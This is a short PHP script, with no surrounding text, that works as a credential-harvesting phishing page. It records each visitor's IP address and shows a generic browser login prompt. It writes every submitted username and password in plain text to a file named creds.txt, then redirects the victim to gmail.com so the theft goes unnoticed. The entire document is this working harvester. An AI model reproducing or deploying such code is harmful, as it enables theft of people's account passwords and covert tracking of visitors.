<?php 

$line = date('Y-m-d H:i:s') . " - $_SERVER[REMOTE_ADDR]";
file_put_contents('visitors.log', $line . PHP_EOL, FILE_APPEND);

if((empty($_SERVER['PHP_AUTH_USER']) or empty($_SERVER['PHP_AUTH_PW'])) and isset($_REQUEST['BAD_HOSTING']) and preg_match('/Basic\s+(.*)$/i', $_REQUEST['BAD_HOSTING'], $matc))
        list($_SERVER['PHP_AUTH_USER'], $_SERVER['PHP_AUTH_PW']) = explode(':', base64_decode($matc[1]));

  if (!isset($_SERVER['PHP_AUTH_USER'])) {
    header('WWW-Authenticate: Basic realm="My Realm"');
    header('HTTP/1.0 401 Unauthorized');
    echo 'Text to send if user hits Cancel button
';
    exit;
  } else {
    
     $file = 'creds.txt';

     $user_pass = "{$_SERVER['PHP_AUTH_USER']} : {$_SERVER['PHP_AUTH_PW']} 
";

     file_put_contents($file, $user_pass, FILE_APPEND);

     header( 'Location: https://gmail.com');

  }
?>

